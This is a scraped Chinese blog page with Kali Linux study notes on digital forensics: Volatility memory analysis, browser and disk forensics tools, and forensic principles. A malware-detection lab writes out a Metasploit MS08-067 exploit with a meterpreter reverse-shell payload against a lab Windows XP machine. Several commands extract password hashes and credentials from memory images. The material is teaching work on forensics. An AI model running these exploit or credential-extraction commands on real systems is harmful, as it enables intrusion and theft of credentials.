<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=cc53U-yoem8lUfoxmFbu2wXynjsFjLnBwEC3Si4GrjvAMVZi0GehgaJnJJSuvMt_a-86ajRPPkZdq5V6hdfOsLik7IbdzMRDgcpHfelW-f6eQWU0YlWGthKivPxBASWwcl_CdYKKhurBl9LH0eE&file_name=/logonPasswords%E7%9A%84%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF.png" alt="logonPasswords的身份信息"></p>
<h4 id="5-实验–Volatility的mimikatz插件"><a href="#5-实验–Volatility的mimikatz插件" class="headerlink" title="5. 实验–Volatility的mimikatz插件"></a>5. 实验–Volatility的mimikatz插件</h4><ul>
<li>Kali<ul>
<li>▲ 2020.03.04 Github的链接失效，暂无法找到mimikatz.py，此模块未实验</li>
<li>从共享文件夹拷贝window XP SP3的内存映像xp.raw到Kali上</li>
<li>从Github上下载mimikatz插件到volatility的plugins库中</li>
<li><strong><code>🔺命令：volatility -f xp.raw imageinfo</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile==WindowXPSP3x86 mimikatz</code></strong></li>
<li>查看是否拿到密码</li>
</ul>
</li>
</ul>
<h4 id="6-实验–Firefox浏览器审计工具"><a href="#6-实验–Firefox浏览器审计工具" class="headerlink" title="6. 实验–Firefox浏览器审计工具"></a>6. 实验–Firefox浏览器审计工具</h4><ul>
<li>▲ 在未关机的情况下取证，找寻firefox使用的浏览信息</li>
<li>Kali<ul>
<li><strong><code>🔺命令：dumpzilla /root/.mozilla/firefox/bvpenhsu.default/ --Passwords</code></strong>（目录可能不一样）</li>
<li>查看是否可看到浏览器信息</li>
</ul>
</li>
<li>▲ 2020.03.04 –All参数被去除</li>
</ul>
<h4 id="7-死取证"><a href="#7-死取证" class="headerlink" title="7. 死取证"></a>7. 死取证</h4><ul>
<li>硬盘镜像<ul>
<li>使用Kali光盘启动计算机创建硬盘镜像文件（位镜像的拷贝）</li>
<li>留足存储镜像文件的存储空间</li>
<li>Dc3dd（来自美国空军计算机犯罪中心）</li>
<li>Dcfldd</li>
<li>Guymager</li>
<li>计算机取证技术参考数据集<ul>
<li><a href="http://www.cfreds.nist.gov/Controlv1_0/control.dd" target="_blank" rel="noopener">http://www.cfreds.nist.gov/Controlv1_0/control.dd</a></li>
</ul>
</li>
<li>DFF（Digital Forensics Framework）<ul>
<li>Open Evidence  #红色表示已经删除的文件</li>
<li>▲ Kali官方已经剔除DFF软件，也无法手动安装，只能去官网手动安装包下载</li>
</ul>
</li>
<li>Autopsy<ul>
<li>非常流行的硬盘镜像分析工具</li>
<li>WebServer+客户端架构</li>
</ul>
</li>
<li>Extundelete<ul>
<li>适用于ext3、ext4文件系统的反删除工具</li>
<li><strong><code>🔺命令：Extundelete [device-file] --restore-file [restore location]</code></strong> </li>
</ul>
</li>
<li>iPhone Backup Analyzer<ul>
<li>分析iTunes生成的iPhone手机备份文件，并非电话image</li>
</ul>
</li>
<li>Foremost（美国开发）<ul>
<li>从内存dump中恢复文档图片，支持raw、dd、iso、vmem、excel、doc等格式（图片非图像）</li>
<li><strong><code>🔺命令：foremost -t jpeg,gif,png,doc -i 7.raw</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="8-实验–Guymager"><a href="#8-实验–Guymager" class="headerlink" title="8. 实验–Guymager"></a>8. 实验–Guymager</h4><ul>
<li>Window 7光盘挂载Kali Linux，forensic mode启动（取证模式）</li>
<li>启动Guymager（可能无发现硬盘，可以进行选择扫描尝试）</li>
<li>选择要取证的硬盘 → 右键 → Acquire images<ul>
<li>Linux dd raw image/Expert Withess Format,sub-format Guymager</li>
<li>▲ 可以分成多个文件，并设置MD5/SHA-1/SHA-256的哈希验证</li>
<li>Case Number 999（钥匙数字）</li>
<li>Evidence Number 001（证据编号）</li>
<li>Examiner mzt（证据人）</li>
<li>Description server（描述）</li>
<li>Image directory（保存路径）</li>
<li>image filename（文件名）</li>
<li>info filename（信息文件名）</li>
</ul>
</li>
<li>Start</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=b530q0aJH5AM4mNQlrn-PR6sLYorGWiNy4-8AagL83_hKfdBeuyz-PbjcwbuRBCyTynYga6NWvnuXNew1n1lV8Y70cVCSlNJrhXlohJUe_HlBIqbMH2Jr0VUmDFNEk0&file_name=/Guymager%E5%8F%96%E8%AF%81.png" alt="Guymager取证"></p>
<h4 id="9-实验–Autopsy"><a href="#9-实验–Autopsy" class="headerlink" title="9. 实验–Autopsy"></a>9. 实验–Autopsy</h4><ul>
<li>Kali<ul>
<li>▲ 2020.03.04 无法拷贝到control.dd文件，输入网址出现乱码</li>
<li>拷贝准备好的control.dd文件到/root目录下</li>
<li>autopsy启动服务端</li>
<li>浏览器访问：<a href="http://localhost:9999/autopsy" target="_blank" rel="noopener">http://localhost:9999/autopsy</a></li>
<li>NEW CASE → 添加信息（Case Name、Description、Investigator）→ NEW CASE</li>
<li>ADD HOST → 填写主机信息</li>
<li>ADD IMAGE → 镜像文件信息（Location、Type(分区还是整盘)、Import Method(一般为copy，move怕断电，Symlink怕移动链接失效)）</li>
<li>Next → Data Integrity（镜像文件的MD5的计算）→ File System Details → ADD</li>
<li>OK</li>
<li>ANALYZE（一般位FILE ANALYSNS）→ 可对文件进行一定的还原</li>
</ul>
</li>
</ul>
<h4 id="10-实验–Foremost"><a href="#10-实验–Foremost" class="headerlink" title="10. 实验–Foremost"></a>10. 实验–Foremost</h4><ul>
<li>Kali<ul>
<li>▲ 2020.03.04 因为Win7 暂时无法拷贝文件出来，所以将实验机器换为Window XP SP3</li>
<li>从共享文件夹拷贝window XP SP3的内存映像xp.raw到Kali上</li>
<li><strong><code>🔺命令：foremost -t jpeg,gif,png,doc -i xp.raw</code></strong></li>
<li>output文件夹中查看提取的文件</li>
</ul>
</li>
</ul>
<h4 id="11-网络取证"><a href="#11-网络取证" class="headerlink" title="11. 网络取证"></a>11. 网络取证</h4><ul>
<li>▲ 网络取证请看&lt;&lt;协议分析&gt;&gt;<ul>
<li>全流量镜像可以还原历史</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%8F%96%E8%AF%81%E5%B7%A5%E5%85%B7--Volatility/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%8F%96%E8%AF%81%E5%B7%A5%E5%85%B7--Volatility/" itemprop="url">Kali Linux笔记(一百一十六)：取证工具--Volatility</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T19:00:16+08:00">
                2020-03-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.3k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  5 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-取证工具"><a href="#1-取证工具" class="headerlink" title="1. 取证工具"></a>1. 取证工具</h4><ul>
<li>▲ 分析内存需要扎实的计算机系统功底</li>
<li>分析内存<ul>
<li><strong><code>🔺命令：volatility imageinfo -f xp.raw</code></strong>  #文件信息，关注profile</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86</code></strong>  #数据库文件</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hivedump -o 0xe124f8a8</code></strong>  #按虚内存地址查看注册表内容</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</code></strong>  #用户账号<ul>
<li>注册表中Administrator对于SAM文件只有特殊的权限，无完全控制权限，可通过修改权限设置，添加父类子类继承选项赋予Administrator对SAM文件、其子文件以及其文件键值的完全控制权</li>
</ul>
</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 printkey -K &quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</code></strong>  #最后登陆的账号</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 userassist</code></strong>  #正在运行的程序、运行过多少次、最后一次运行时间等</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 pslist</code></strong>  #内存进程信息<ul>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 memdump -p 1456 -D test</code></strong>  #dump进程内存</li>
</ul>
</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hivelist</code></strong>  #注册表的蜂巢文件（SOFTWARE–操作系统+自安装软件信息）</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 pstree</code></strong>  #内存进程树信息</li>
<li><strong><code>🔺命令：volatility cmdscan -f xp.raw --profile=WinXPSP3X86</code></strong>  #命令行历史（类似history）</li>
<li><strong><code>🔺命令：volatility netscan -f xp.raw --profile=WinXPSP3X86</code></strong>  #所有网络连接<ul>
<li>该命令对x86架构的机器不起作用</li>
</ul>
</li>
<li><strong><code>🔺命令：volatility connscan -f xp.raw --profile=WinXPSP3X86</code></strong>  #所有建立的网络连接</li>
<li><strong><code>🔺命令：volatility iehistory -f xp.raw --profile=WinXPSP3X86</code></strong>  #建立的IE连接</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hashdump -y system虚地址 -s SAM虚地址</code></strong>  #提取哈希值</li>
</ul>
</li>
</ul>
<h4 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h4><ul>
<li>▲ 2020.03.04 因为Win7 暂时无法拷贝文件出来，所以将实验机器换为Window XP SP3</li>
<li>插件目录：/usr/lib/python2.7/dis-packages/volatility/plugins</li>
<li>拷贝Dump内存文件xp.raw到Kali的机子上</li>
<li>Volatility <ul>
<li>-h：帮助功能列表</li>
<li>-F：要分析文件</li>
<li>–profile：操作系统类型</li>
<li>-p：进程PID</li>
<li>-D：dump内存到的目录</li>
<li>-o：虚内存地址</li>
<li>-k：注册表的键值</li>
<li>-y：使用SYSTEM的虚地址</li>
<li>-s：使用SAM的虚地址</li>
</ul>
</li>
<li><strong><code>🔺命令：volatility imageinfo -f xp.raw</code></strong> </li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 pslist</code></strong><ul>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 memdump -p 1456 -D test</code></strong><ul>
<li>十六进制查看：<strong><code>🔺命令：hexeditor 1456.dump</code></strong></li>
<li>关键字符串：<strong><code>🔺命令：strings 1456.dump | grep password</code></strong></li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 pstree</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hivelist</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hivedump -o 0xe124f8a8</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 printkey -K &quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 userassist</code></strong></li>
<li><strong><code>🔺命令：volatility cmdscan -f xp.raw --profile=WinXPSP3X86</code></strong></li>
<li><strong><code>🔺命令：volatility netscan -f xp.raw --profile=WinXPSP3X86</code></strong></li>
<li><strong><code>🔺命令：volatility connscan -f xp.raw --profile=WinXPSP3X86</code></strong></li>
<li><strong><code>🔺命令：volatility iehistory -f xp.raw --profile=WinXPSP3X86</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hashdump -y system虚地址 -s SAM虚地址</code></strong></li>
</ul>
<h4 id="3-Volatility插件"><a href="#3-Volatility插件" class="headerlink" title="3. Volatility插件"></a>3. Volatility插件</h4><ul>
<li>Firefoxhistory插件（Python脚本文件）<ul>
<li>▲ 2020.03.04 因Window XP SP3中没有Firefox，此模块未实验</li>
<li><a href="http://downloads.volatilityfoundation.org/contest/2014/DaveLasalle_ForensicSuite.zip" target="_blank" rel="noopener">http://downloads.volatilityfoundation.org/contest/2014/DaveLasalle_ForensicSuite.zip</a> </li>
<li>插件地址：/usr/lib/python2.7/dist-packages/volatility/plugins/ </li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 firefoxhistory</code></strong> </li>
</ul>
</li>
<li>USN日志记录插件<ul>
<li>NTFS特性，用于跟踪硬盘内容变化（不具体记录变更内容）</li>
<li><a href="https://raw.githubusercontent.com/tomspencer/volatility/master/usnparser/usnparser.py" target="_blank" rel="noopener">https://raw.githubusercontent.com/tomspencer/volatility/master/usnparser/usnparser.py</a> </li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 usnparser --output=csv --output-file=usn.csv</code></strong><ul>
<li>▲ 2020.03.04 能输出文件，但文件没有任何信息</li>
</ul>
</li>
</ul>
</li>
<li>Timeline插件<ul>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 timeliner</code></strong></li>
<li>从多个位置收集大量系统活动信息，绘画时间线、分析</li>
</ul>
</li>
</ul>
<h4 id="4-内存取证发现恶意软件"><a href="#4-内存取证发现恶意软件" class="headerlink" title="4. 内存取证发现恶意软件"></a>4. 内存取证发现恶意软件</h4><ul>
<li>恶意程序分析包网站集合<ul>
<li><a href="https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples" target="_blank" rel="noopener">https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples</a></li>
<li><a href="https://code.google.com/archive/p/volatility/wikis/SampleMemoryImages.wiki" target="_blank" rel="noopener">https://code.google.com/archive/p/volatility/wikis/SampleMemoryImages.wiki</a></li>
<li>▲ 2020.03.04 上列程序包，已经多年未更新</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址，关闭防火墙</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong><ul>
<li><strong><code>🔺命令：set RHOST Window XP SP3的IP</code></strong></li>
<li><strong><code>🔺命令：set target 34</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>查看是否拿到shell</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>启动Dumpit，保存文件为xp.raw</li>
</ul>
</li>
<li>Kali<ul>
<li>拷贝xp.raw到Kali上</li>
<li><strong><code>🔺命令：volatility imageinfo -f xp.raw</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3x86 pstree</code></strong> #查看进程树</li>
<li><strong><code>🔺命令：volatility connscan</code></strong>  #查看网络连接，查看可疑进程的PID</li>
<li><strong><code>🔺命令：volatility getsids -p 可疑进程的PID（可多个）</code></strong>  #查看进程的SID<ul>
<li>正常的情况下，svchost的权限无SYSTEM权限，权限数量一般一样</li>
</ul>
</li>
<li><strong><code>🔺命令：volatility dlllist -p 111,222</code></strong>  #查看调动库文件</li>
<li><strong><code>🔺命令：volatility malfind -p 111,222 -D test</code></strong>  #检查结果查毒<ul>
<li>病毒文件标志<ul>
<li>标志：PAGE_EXECUTE_READWRITE</li>
<li>可执行文件：PE程序 -&gt; 在十六进制中为MZ开头</li>
<li>内存地址：内存地址多块，存在多个内存地址空间</li>
<li>查看文件类型：可执行程序还是数据（查看文件类型：file *）</li>
</ul>
</li>
<li>杀毒软件查杀<ul>
<li>拷贝单个文件到有杀毒软件的系统，查看是否被查杀</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>▲ 恶意程序<ul>
<li>体积小：基本上调系统的动态链接库，使自己的体积小，但兼容性差，到别的操作系统可能无法执行</li>
<li>体积大：基本上调自己的动态链接库，体积大，但兼容性好，可到别的操作系统执行</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%BA%94)%EF%BC%9A%E5%8F%96%E8%AF%81%E7%A7%91%E5%AD%A6%E3%80%81%E5%88%86%E7%B1%BB%E3%80%81%E5%8E%9F%E5%88%99%E3%80%81%E6%96%B9%E6%B3%95%E3%80%81%E5%B7%A5%E5%85%B7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%BA%94)%EF%BC%9A%E5%8F%96%E8%AF%81%E7%A7%91%E5%AD%A6%E3%80%81%E5%88%86%E7%B1%BB%E3%80%81%E5%8E%9F%E5%88%99%E3%80%81%E6%96%B9%E6%B3%95%E3%80%81%E5%B7%A5%E5%85%B7/" itemprop="url">Kali Linux笔记(一百一十五)：取证科学、分类、原则、方法、工具</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T11:52:55+08:00">
                2020-03-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  980 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-取证科学简介"><a href="#1-取证科学简介" class="headerlink" title="1. 取证科学简介"></a>1. 取证科学简介</h4><ul>
<li>Forensic investigations</li>
<li>法庭取证调查</li>
<li>事件响应调查<ul>
<li>黑客攻击、渗透测试痕迹</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=df66VAp0ztjMApaji8NM3rOZw0sBTyNRhFzgcicA2Oq4J9Wua5fFoEUx_-11NIVdARg-Lzt-xXCuJtHDvEj40JQve8iE7EPm_SJ3Z87lHKEbqAZrPDthpQ8ylZo5Lo-l6lqQvZ1HfqnFewObAmu4Rg&file_name=/CSI%EF%BC%9ACRIME%20SCENE%20INVESTIGATION.png" alt="CSI：CRIME SCENE INVESTIGATION"></p>
<h4 id="2-取证科学"><a href="#2-取证科学" class="headerlink" title="2. 取证科学"></a>2. 取证科学</h4><ul>
<li>什么是Forensic科学<ul>
<li>法医的、用于法庭的、辩论学、法医学</li>
<li>为了侦破案件还原事实真相，收集法庭证据的一系列科学方法<ul>
<li>参考本地区法律要求</li>
<li>实践操作通用原则</li>
</ul>
</li>
</ul>
</li>
<li>CSI：物理取证<ul>
<li>指纹、DNA、弹道、血迹</li>
<li>物理取证的理论基础是物质交换原则</li>
</ul>
</li>
<li>本章关注：数字取证 / 计算机取证 / 电子取证<ul>
<li>智能设备、计算机、手机平板、IoT、有线及无线通信（Wireshark抓包分析）、数据存储</li>
</ul>
</li>
</ul>
<h4 id="3-通用原则"><a href="#3-通用原则" class="headerlink" title="3. 通用原则"></a>3. 通用原则</h4><ul>
<li>维护证据完整性<ul>
<li>数字取证比物理取证幸运的多，可以有无限数量的拷贝进行分析<ul>
<li>▲ 对iphone手机芯片的复制，可以实现理论上的暴力破解</li>
</ul>
</li>
<li>数字HASH值验证数据完整性</li>
</ul>
</li>
<li>维护监管链<ul>
<li>物理证物保存在证物袋中，每次取出使用严格记录，避免破坏污染</li>
<li>数字证物原始版本写保护，使用拷贝进行分析</li>
</ul>
</li>
<li>标准的操作步骤<ul>
<li>证物使用严格按照规范流程，即使事后证明流程有误（免责）</li>
</ul>
</li>
<li>取证分析全部过程记录文档</li>
<li>数字取证者的座右铭<ul>
<li>不要破坏数据现场（看似简单，实际几乎无法实现）<ul>
<li>系统命令可能被植入木马，整个计算机都不可信 → 使用干净U盘的操作系统命令</li>
<li>使用干净U盘的操作系统命令可能也会占用内存资源，破坏现场</li>
<li>▲ 虚拟机一定程度上通过控制台可实现不破坏数据现场</li>
</ul>
</li>
<li>寄存器、CPU缓存、I/O设备缓存等易失性数据几乎无法获取</li>
<li>系统内存是主要的易失性存储介质取证对象，不修改无法获取其中数据<ul>
<li>程序、操作系统指令会对内存进行修改</li>
</ul>
</li>
<li>非易失性存储介质通常使用完整镜像拷贝保存<ul>
<li>不同于文件拷贝，从磁道层面的复制（01代码的复制，可能包含已删除的文件）</li>
</ul>
</li>
<li>正常关机还是直接拔掉电源（数据丢失破坏）<ul>
<li>拔电源：存在于内存中的数据无法保存到硬盘</li>
<li>正常关机：木马程序可能进行数据擦除破坏</li>
<li>▲ 建议拔电源，Ext4日志型文件型系统直接拔电源，不会丢失日志</li>
</ul>
</li>
</ul>
</li>
<li>证据搜索<ul>
<li>数据（数据提炼）</li>
<li>信息（信息收集）</li>
<li>证据（得出入侵的证据 → 法庭的呈堂证供/技术分析）</li>
</ul>
</li>
<li>作为安全从业者<ul>
<li>通过取证还原黑客入侵的轨迹</li>
<li>作为渗透测试和黑客攻击区分标准<ul>
<li>世纪佳缘事件</li>
<li>印象笔记渗透测试事件</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-取证方法"><a href="#4-取证方法" class="headerlink" title="4. 取证方法"></a>4. 取证方法</h4><ul>
<li>活取证（服务器未关机，可对内存和硬盘取证）<ul>
<li>抓取文件metadata、创建时间线、命令历史、分析日志文件、哈希摘要、转存内存信息</li>
<li>使用未受感染的干净程序执行取证</li>
<li>U盘 / 网络存储收集到的数据</li>
<li>▲ 新建用户取证</li>
</ul>
</li>
<li>死取证（服务器关机、可对硬盘取证）<ul>
<li>关机后制作硬盘镜像、分析镜像（MBR、GPT、LVM）<ul>
<li>硬盘格式<ul>
<li>大块MBR</li>
<li>全局分区表GPT</li>
<li>逻辑卷LVM</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="5-取证工具–Dumpit"><a href="#5-取证工具–Dumpit" class="headerlink" title="5. 取证工具–Dumpit"></a>5. 取证工具–Dumpit</h4><ul>
<li>不考虑法律因素、法庭证据、监管链、文档记录等取证环节</li>
<li>只介绍Kali当中部分取证工具的使用方法</li>
<li>内存dump工具<ul>
<li>Dumpit：<a href="http://www.moonsols.com/wp-content/uploads/downloads/2011/07/DumpIt.zip" target="_blank" rel="noopener">http://www.moonsols.com/wp-content/uploads/downloads/2011/07/DumpIt.zip</a><ul>
<li>▲ 2020.03.04 此连接失效，改为后续链接：<a href="http://www.secist.com/archives/2076.html" target="_blank" rel="noopener">http://www.secist.com/archives/2076.html</a></li>
</ul>
</li>
<li>内存文件与内存大小接近或者稍微大一点，raw格式</li>
</ul>
</li>
<li>实验<ul>
<li>Window 7</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=2638rdSKJV3HVd-tYIUJnkoRfqNDQSyiuMX3yluETjB9O1Ve6zMIW2fFmrDkG0M3vtkS580i71YLHOwz3PrU-Gb7Af2x256yinj9RuvNRJ54sAwdNjtm&file_name=/Dumpit.png" alt="Dumpit"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E5%9B%9B)%EF%BC%9A%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E5%9B%9B)%EF%BC%9A%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/" itemprop="url">Kali Linux笔记(一百一十四)：社会工程学</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T11:47:34+08:00">
                2020-03-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  689 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
